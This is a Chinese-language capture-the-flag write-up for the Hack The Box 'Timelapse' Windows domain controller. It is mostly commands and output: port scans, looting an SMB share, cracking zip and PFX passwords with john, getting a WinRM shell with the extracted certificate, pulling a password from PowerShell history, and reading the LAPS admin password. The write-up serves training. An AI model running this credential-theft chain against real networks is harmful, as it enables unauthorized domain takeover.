---
title: HTB-Timelapse Writeup
date: 2026-03-018T17:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - Writeup
  - HTB
---
## 初始侦察

### Nmap 端口扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali/Timelapse]
└─$ sudo nmap --min-rate 10000 -p- 10.129.227.113 -oA ports
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-18 05:06 EDT
Nmap scan report for 10.129.227.113
Host is up (0.17s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5986/tcp  open  wsmans
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49692/tcp open  unknown
49724/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 20.58 seconds
```

将扫描出的 tcp 端口提取做备用。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Timelapse]
└─$ grep open ports.nmap | awk -F '/' '{print $1}' | paste -sd ','
53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49692,49724

```

### Nmap 详细信息扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali/Timelapse]
└─$ sudo nmap -sT -sC -sV -O -p53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49692,49724 10.129.227.113                                     
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-18 05:20 EDT
Nmap scan report for 10.129.227.113
Host is up (0.17s latency).

PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-03-18 17:20:08Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
|_ssl-date: 2026-03-18T17:21:48+00:00; +7h59m59s from scanner time.
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49692/tcp open  msrpc             Microsoft Windows RPC
49724/tcp open  msrpc             Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-03-18T17:21:10
|_  start_date: N/A
|_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m58s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 114.23 seconds
```

### Nmap 默认脚本扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali/Timelapse]
└─$ sudo nmap --script=vuln -p53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,49673,49674,49692,49724 10.129.227.113
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-18 05:20 EDT
Stats: 0:00:53 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 89.29% done; ETC: 05:21 (0:00:05 remaining)
Stats: 0:00:55 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 89.29% done; ETC: 05:21 (0:00:05 remaining)
Stats: 0:00:56 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 89.29% done; ETC: 05:21 (0:00:05 remaining)
Nmap scan report for 10.129.227.113
Host is up (0.15s latency).

PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
|_ssl-ccs-injection: No reply from server (TIMEOUT)
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
|_ssl-ccs-injection: No reply from server (TIMEOUT)
5986/tcp  open  wsmans
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49692/tcp open  unknown
49724/tcp open  unknown

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR

Nmap done: 1 IP address (1 host up) scanned in 93.35 seconds
```

### Nmap UDP 扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali/Timelapse]
└─$ sudo nmap -sU --top-ports 20 10.129.227.113            
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-18 05:21 EDT
Nmap scan report for 10.129.227.113
Host is up (0.26s latency).

PORT      STATE         SERVICE
53/udp    open          domain
67/udp    open|filtered dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
123/udp   open          ntp
135/udp   open|filtered msrpc
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   open|filtered snmp
162/udp   open|filtered snmptrap
445/udp   open|filtered microsoft-ds
500/udp   open|filtered isakmp
514/udp   open|filtered syslog
520/udp   open|filtered route
631/udp   open|filtered ipp
1434/udp  open|filtered ms-sql-m
1900/udp  open|filtered upnp
4500/udp  open|filtered nat-t-ike
49152/udp open|filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 17.35 seconds
```

明确开放的 UDP 端口只有 53、123，靶机开放 DNS、Kerberos、LDAP、SMB，很可能是一个域控制器，将 Nmap 扫描出的域名进行解析。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Timelapse]
└─$ sudo vim /etc/hosts
                                                                                                
┌──(kali㉿kali)-[~/Work/Kali/Timelapse]
└─$ tail -n 1 /etc/hosts
10.129.227.113 timelapse.htb dc01.timelapse.htb
```

Windows 的远程管理 WinRM 经常运行在 TCP 5985 端口上，通常情况下，它的 TLS 封装版本会运行在 TCP 5986 上，即这台靶机的情况。

## Smb 枚举

使用 Smbmap 枚举共享目录。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Timelapse]                                                                                                                                                           
└─$ smbmap -H timelapse.htb -u enil                                                                                                                                                               
                                                                                                                                                                                                  
    ________  ___      ___  _______   ___      ___       __         _______                                                                                                                       
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\                                                                                                                      
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)                                                                                                                     
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/                                                                                                                      
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /                                                                                                                          
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \                                                                                                                         
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)                                                                                                                        
-----------------------------------------------------------------------------                                                                                                                     
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com                                                                                                                     
                     https://github.com/ShawnDEvans/smbmap                                                                                                                                        

[*] Detected 1 hosts serving SMB                                                                                                   
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                           
                                                                                                                              
[+] IP: 10.129.227.113:445      Name: timelapse.htb             Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Shares                                                  READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share
```

其中 Shares 是非标准共享，匿名可读，枚举其目录结构。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Timelapse]
└─$ smbmap -H timelapse.htb -u enil -r Shares

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.129.227.113:445      Name: timelapse.htb             Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Shares                                                  READ ONLY
        ./Shares
        dr--r--r--                0 Mon Oct 25 11:55:14 2021    .
        dr--r--r--                0 Mon Oct 25 11:55:14 2021    ..
        dr--r--r--                0 Mon Oct 25 15:40:06 2021    Dev
        dr--r--r--                0 Mon Oct 25 11:55:14 2021    HelpDesk
        SYSVOL                                                  NO ACCESS       Logon server share 
[*] Closed 1 connections
```

使用 Smbclient 枚举进一步确认。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Timelapse]
└─$ smbclient -L //dc01.timelapse.htb        
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shares          Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to dc01.timelapse.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

确认将 Shares 作为首要目标进行尝试。

连接 Shares 下载其中的文件至 Kali。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Timelapse]
└─$ smbclient //dc01.timelapse.htb/Shares
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Oct 25 11:39:15 2021
  ..                                  D        0  Mon Oct 25 11:39:15 2021
  Dev                                 D        0  Mon Oct 25 15:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 11:48:42 2021

                6367231 blocks of size 4096. 1328458 blocks available
smb: \> cd Dev
smb: \Dev\> ls
  .                                   D        0  Mon Oct 25 15:40:06 2021
  ..                                  D        0  Mon Oct 25 15:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 11:46:42 2021

                6367231 blocks of size 4096. 1328458 blocks available
smb: \Dev\> get winrm_backup.zip
getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (4.5 KiloBytes/sec) (average 4.5 KiloBytes/sec)
smb: \Dev\> cd ..
smb: \> cd HelpDesk
smb: \HelpDesk\> ls
  .                                   D        0  Mon Oct 25 11:48:42 2021
  ..                                  D        0  Mon Oct 25 11:48:42 2021
  LAPS.x64.msi                        A  1118208  Mon Oct 25 10:57:50 2021
  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 10:57:46 2021
  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 10:57:40 2021
  LAPS_TechnicalSpecification.docx      A    72683  Mon Oct 25 10:57:44 2021

                6367231 blocks of size 4096. 1328458 blocks available
smb: \HelpDesk\> mget *
LAPS_TechnicalSpecification.docx
getting file \HelpDesk\LAPS.x64.msi of size 1118208 as LAPS.x64.msi (357.9 KiloBytes/sec) (average 302.3 KiloBytes/sec)
getting file \HelpDesk\LAPS_Datasheet.docx of size 104422 as LAPS_Datasheet.docx (57.8 KiloBytes/sec) (average 222.2 KiloBytes/sec)
getting file \HelpDesk\LAPS_OperationsGuide.docx of size 641378 as LAPS_OperationsGuide.docx (439.2 KiloBytes/sec) (average 267.6 KiloBytes/sec)
getting file \HelpDesk\LAPS_TechnicalSpecification.docx of size 72683 as LAPS_TechnicalSpecification.docx (123.2 KiloBytes/sec) (average 256.3 KiloBytes/sec)
```

发现有一个 zip 压缩包，尝试解压。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Timelapse]
└─$ unzip winrm_backup.zip 
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
   skipping: legacyy_dev_auth.pfx    incorrect password
```

解压失败，需要密码，使用 zip2john 获取 hash，再使用 john 破解密码。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Timelapse]
└─$ zip2john winrm_backup.zip > zip.hash
ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8
                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/Timelapse]
└─$ cat zip.hash 
winrm_backup.zip/legacyy_dev_auth.pfx:$pkzip$1*1*2*0*965*9fb*12ec5683*0*4e*8*965*72aa*1a84b40ec6b5c20abd7d695aa16d8c88a3cec7243acf179b842f2d96414d306fd67f0bb6abd97366b7aaea736a0cda557a1d82727976b2243d1d9a4032d625b7e40325220b35bae73a3d11f4e82a408cb00986825f936ce33ac06419899194de4b54c9258cd7a4a7f03ab181b611a63bc9c26305fa1cbe6855e8f9e80c058a723c396d400b707c558460db8ed6247c7a727d24cd0c7e93fbcbe8a476f4c0e57db890a78a5f61d1ec1c9a7b28b98a81ba94a7b3a600498745859445ddaef51a982ae22577a385700fdf73c99993695b8ffce0ef90633e3d18bf17b357df58ea7f3d79f22a790606b69aed500db976ae87081c68d60aca373ad25ddc69bc27ddd3986f4d9ce77c4e49777c67a0740d2b4bbca38b4c2b3ee329ac7cf30e5af07f13d860a072784e753a999f3dd0d2c3bbb2269eeffe2f0b741441538e429cb9e8beee2999557332ac447393db6ed35856bd7fcae85329b99b21449f3bb63c9fb74870dbf76e7dc76859392bf913da2864555b6ed2a384a2ae8a6c462e5115adbf385f073cfc64ec7a4646386cf72b5529bbf48af050640f26c26e337add96b61aee56d3d92de09f25c40efe56d4c2b853ce29de32c05634afc4dc9ca8df991b73e10db5bb9cd3fc807bfe05bb789a4b4a525001d253ca6f67abc928ebe7777a0b2d06d7fd2d61123c7e6b8050fe51994f116bc9e694cbdd6e81bfe71672582e7329cb78e20793b970407ea0bb8787c93875be25432987b2fb385c08e1970e5f8868db466476ef41b157eaf4d9a69508d57166213d81f1f981cffd5a6d2053a65c380ad98f10eb2b94104cd41104c59e6f4d782868f38ae64c7b0c29fb0e05d18429c26dc3f5a9c4ec9328b0aff3a41679f9f12e9b4e2cc9dfca5a67c021a093549863923422ada4ccf082924ef1ec4ec38847bf2bffb893f14abecdad3c83a31e276a23542ff08cdc7d7ec6576dbda1edf1326174b13c7f078d6ea4dc90a743cdf6aa076a17250ac2fff6de8113ffc58dd4ccda187b6c7890264f0d0ff113aa3fa15b8515d0857f8110b99fa2915f0476a08b107965fa5e74c05018db0d9a8ecc893780027b58225e091b50aa07684f1990508275d87fd7a8f28193ca41d9ce649e3de4885913b15f318e7459c443849a248463bbfe949def6d9ca95e6ace6613eabf758c6399639f1f7779fc9aeee32d518a0db9a046340e002445b8ae9a5cb630a194a490d326247f3582680814dfed79496475e4a06f11d4433b13ed3c3803e3c1da5335cd7919453ce0a6b62116c0ffa0fc7c4bba77bbba080092541697c3200edc7e9aa001a01fc0063b27159384538ecb7cddab32a6feca01853ac712a0e21a436d647d1c94bd0a5b40510cb080d4ce79a2e49fc82fd961106b7b73d2e24603711300ddc711b8cc284cc284777d230ebcc140ab0296676f465da1afeb40fe2f4f9636238c09a9716a1f3071fd2653b9956c9180270b1582074175570d5784af0d22460e6d28153f146d01ff0f2388894b0541a9df950e1515a2397360e09c6dfd92feaf068f560be034bcf26cabc76be09a94254bbbf88f4ee85241c12be370ca32cc5391e33f05a2e7a75afe7876a893fdc9fded2ea1ac701001cf0d34eaba84dd4815a28dc4cfe6c3abc35a057f6b95dd4fdb07a99edc0a020273f5eb9b2d2e6686deda3c1c9c5deb85b9192d68a841cd9a7aa448ddd66e0a839d81f0106a8a1e38f6da99a3b973a0598aca2ba36cf9ef0b4a9da6ae327069a88677b7e5303a08cea1a37f2623d98233672e425693e16ade5b16d49669e2002aec50aedeccc21af37901d278bd3a5b7618b9f0332a4848a29e9e3eccef234cf2392d46c33be6c3c75e57f6c19998febadf2c6a3e22a6e4276e6863f8d16ecec1f4eca9495a031e5f7426bf90a9831b9901588e72330fc42fe3ed7a09d7404a14727b7b876786b35873cf24deb921662c458d05b8c8872d88e8889407024e46d06d8f3cf9a1d144deb91acf2273c13600bc2bbc9c1405269c3eff0042d0533c95f45c28ed2b8854fbbda941b1957d27122d8a6afe09261f206ccde7e7c4f69c8d46d4e101849c02c9eecc65e365ebf48e3ce836385dcfd824e085b0104b1210b5acfedb3df857cdc2ad9976660dfb20b228ce127c4cdc5bb9d89f65822ebd728b2d1dbce2872e9fa113c19ed251e7c103022b5029b63e35bcd0ef75bf13f1bb56499f1505b6eef27aa6fd079f4d4156c566a76d8b6bcdd518cdd6ea3de2048f9b059e338946fa2549ab27646ba9bfe08580df4582be056dcc68232efef533ea90c9c8d613e22fd4f2d75c6a89e4643ff3717a21dc0624a1c844549fc9700d137865b018eef82803ec1b3f19f9e3f25c276062effb0829c00825677d21530b14a8ee27c6507ff31549430f66488f4ef996cf784f37bbf103e49f17bef1ae41e02dce2a3715127942fcaec5da410f04174664b7eb0788e83920ad9afa223a5a4791bb28b3d5e75933edfd7535aaeb984f8dc1c5e3880411c733f775c93b620f14662c1594c909eceb7c8c25807b9e49771847a567d6fd63c607c6ebf71714a869cd4eb7956995cb7011c7973c705ee13aeabc319ff6f71569c9c46821cda0db6555dde9939f27f68d1b6dfcfb53b0ed1c9f35c7d29e550437ab80da87384614f9508dbb49f8be5a85c1bfebe13067aff3fd745009db52a4de15761f67ad2a3bf89440d134ed7c6c96c41340c6947785b75698e6b61a0d2da6ffe4290a15a932d42d5e2c4928a92121b0cb3c11a7bbb5fa5a70e31f7bd24e892466e767c4193f5902eb4fc22d1b9c9e7dc8f27886ca3a37dbd842a9fb445adaa738cddbc4e0b62c14b49dc807843db29df781a65491ae52dc16b5d5dc2193f965a595cd72c5b6f1e63e1b4b521e9d891b481fef699fb2ccb853df7b8a902910b229db859d293628baf30891c255fa46d337336fb0b4a47986939372f13f4315c38af852e9a8893fe275be0e5b095c1219edc026c71236ff3a314084383ad0228f26b7935f454c8d3d59306a2c7eb7f9220a67e8c1a2f508760f3ccdb52399e81bcb7e5347c1083ecbdb1c009338e017721b4324a40329a5938ab4ee99d087a2edb62d687fcebeda2211760b2287ff574ebc66e076132cab4cb15e1e551acf11f3ed87970aee89159421facc8eb82bca90a36c43f75df5bececfde3128e2834c5ecd067e61c9ba954cc54fc291a1458bdfe9f49fba35eb944625a528fb9d474aaa761314740997e4d2ed3b1cb8e86744cfb6c9d5e3d758684ff3d9fdc1ba45b39141625d4e6ba38cd3300507555935db1193b765d226c463481388a73d5361e57b7b40c7d3df38fc5da2c1a255ff8c9e344761a397d2c2d59d722723d27140c6830563ee783156404a17e2f7b7e506452f76*$/pkzip$:legacyy_dev_auth.pfx:winrm_backup.zip::winrm_backup.zip
                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/Timelapse]
└─$ john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
1g 0:00:00:00 DONE (2026-03-18 08:51) 2.631g/s 9140Kp/s 9140Kc/s 9140KC/s suzyqzb..superkebab
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

破解出密码是 `supremelegacy`，解压 zip。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Timelapse]
└─$ unzip winrm_backup.zip   
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
  inflating: legacyy_dev_auth.pfx    
                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/Timelapse]
└─$ ls
LAPS_Datasheet.docx  LAPS_OperationsGuide.docx  LAPS_TechnicalSpecification.docx  LAPS.x64.msi  legacyy_dev_auth.pfx  ports.gnmap  ports.nmap  ports.xml  winrm_backup.zip  zip.hash
                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/Timelapse]
└─$ la -liah legacyy_dev_auth.pfx 
2782300 -rwxr-xr-x 1 kali kali 2.5K Oct 25  2021 legacyy_dev_auth.pfx
```

发现一个 pfx 文件，pfx 是一种将证书与私钥打包在一个文件中的二进制格式，通常用于密码保护。尝试提取私钥时发现需要密码。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Timelapse]
└─$ openssl pkcs12 -info -in legacyy_dev_auth.pfx
Enter Import Password:
MAC: sha1, Iteration 2000
MAC length: 20, salt length: 20
Mac verify error: invalid password?
```

使用 pfx2john 获取 hash。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Timelapse]
└─$ pfx2john legacyy_dev_auth.pfx > pfx.hash
                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/Timelapse]
└─$ la -liah pfx.hash            
2782301 -rw-rw-r-- 1 kali kali 5.0K Mar 18 09:57 pfx.hash
```

使用 john 破解密码。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Timelapse]
└─$ john pfx.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 128/128 AVX 4x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)     
1g 0:00:00:31 DONE (2026-03-18 09:58) 0.03162g/s 102205p/s 102205c/s 102205C/s thuglife06..thsco04
Use the "--show" option to display all of the cracked passwords reliably
```

破解出密码为 `thuglegacy`，提取私钥。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Timelapse]
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key-enc
Enter Import Password:
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/Timelapse]
└─$ ls -liah legacyy_dev_auth.key-enc 
2782302 -rw------- 1 kali kali 2.1K Mar 18 10:02 legacyy_dev_auth.key-enc

```

解密密钥。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Timelapse]
└─$ openssl rsa -in legacyy_dev_auth.key-enc -out legacyy_dev_auth.key
Enter pass phrase for legacyy_dev_auth.key-enc:
writing RSA key
                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/Timelapse]
└─$ ls -liah legacyy_dev_auth.*  
2782303 -rw------- 1 kali kali 1.7K Mar 18 10:06 legacyy_dev_auth.key
2782302 -rw------- 1 kali kali 2.1K Mar 18 10:02 legacyy_dev_auth.key-enc
2782300 -rwxr-xr-x 1 kali kali 2.5K Oct 25  2021 legacyy_dev_auth.pfx

```

提取证书。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Timelapse]
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out                          
pkcs12: Option -out needs a value
pkcs12: Use -help for summary.
                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/Timelapse]
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out legacyy_dev_auth.crt
Enter Import Password:
                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali/Timelapse]
└─$ ls -liah legacyy_dev_auth.*
2782304 -rw------- 1 kali kali 1.3K Mar 18 10:07 legacyy_dev_auth.crt
2782303 -rw------- 1 kali kali 1.7K Mar 18 10:06 legacyy_dev_auth.key
2782302 -rw------- 1 kali kali 2.1K Mar 18 10:02 legacyy_dev_auth.key-enc
2782300 -rwxr-xr-x 1 kali kali 2.5K Oct 25  2021 legacyy_dev_auth.pfx
```

在加密和证书相关的上下文中， `.pem` 与 `.key` 是两种不同的扩展名，`.pem` 通常用于存储加密的文本数据，使用 base64 存储数据，使用 `-----BEGIN...-----` 和 `-----END...-----` 标记包装数据；`.key` 通常以二进制存储数据。

## 初始立足点

使用 Evil-winrm 获取初始立足点

```bash
┌──(kali㉿kali)-[~/Work/Kali/Timelapse]
└─$ evil-winrm -i timelapse.htb -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crt 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami;hostname
timelapse\legacyy
dc01
```

其中证书登入需要启用 SSL 加密，即给定参数 -S，证书连接方式与 5986 端口均需要给定参数 -S。

查看用户的历史记录。

```bash
*Evil-WinRM* PS C:\Users\legacyy\Desktop> type c:\Users\legacyy\AppData\Roaming\Microsoft\Windows\Powershell\PSReadLine\ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

发现 `svc_deploy` 用户的密码是 `E3R$Q62^12p7PLlC%KWaxuaV`，使用 evil-winrm 尝试登入。

## Windows 提权

枚举基本信息。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Timelapse]
└─$ evil-winrm -i timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami;hostname
timelapse\svc_deploy
dc01
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> net user svc_deploy
User name                    svc_deploy
Full Name                    svc_deploy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/25/2021 12:12:37 PM
Password expires             Never
Password changeable          10/26/2021 12:12:37 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   10/25/2021 12:25:53 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
The command completed successfully.

```

`svc_deploy` 属于 `LAPS_Readers` 组，可能可以读取 LAPS，使用 Get-ADComputer 命令请求 ms-mcs-admpwd 属性。

```bash
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-ADComputer DC01 -property 'ms-mcs-admpwd'


DistinguishedName : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
DNSHostName       : dc01.timelapse.htb
Enabled           : True
ms-mcs-admpwd     : FLUXPLDxIYVs1-ld9}{@gR%(
Name              : DC01
ObjectClass       : computer
